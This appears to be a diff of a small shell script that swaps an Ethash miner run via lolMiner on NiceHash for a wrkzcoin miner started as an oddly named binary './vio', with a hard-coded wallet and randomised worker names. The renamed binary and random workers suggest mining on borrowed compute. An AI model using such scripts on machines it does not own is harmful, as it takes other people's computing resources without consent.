@@ -1,7 +1,9 @@
-wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.29/lolMiner_v1.29_Lin64.tar.gz
+POOL=pool.hashvault.pro:80
 
-tar -xvf lolMiner_v1.29_Lin64.tar.gz
+WALLET=TRTLv1Hqo3wHdqLRXuCyX3MwvzKyxzwXeBtycnkDy8ceFp4E23bm3P467xLEbUusH6Q1mqQUBiYwJ2yULJbvr5nKe8kcyc4uyps
 
-cd 1.29 ; ./lolMiner --algo ETHASH --pool daggerhashimoto.eu.nicehash.com:3353 -u 0x2b33c8563d901ba5381d60fcfacc61664c7db5ae.worker1 --ethstratum ETHPROXY
+WORKER=$(echo $(shuf -i 1-999999999 -n 1)-FA)
 
-tidur 999999999999999999999999999999
+ALGO=wrkzcoin
+
+./vio --pool $POOL --username $WALLET.$WORKER --password x --algorithm $ALGO
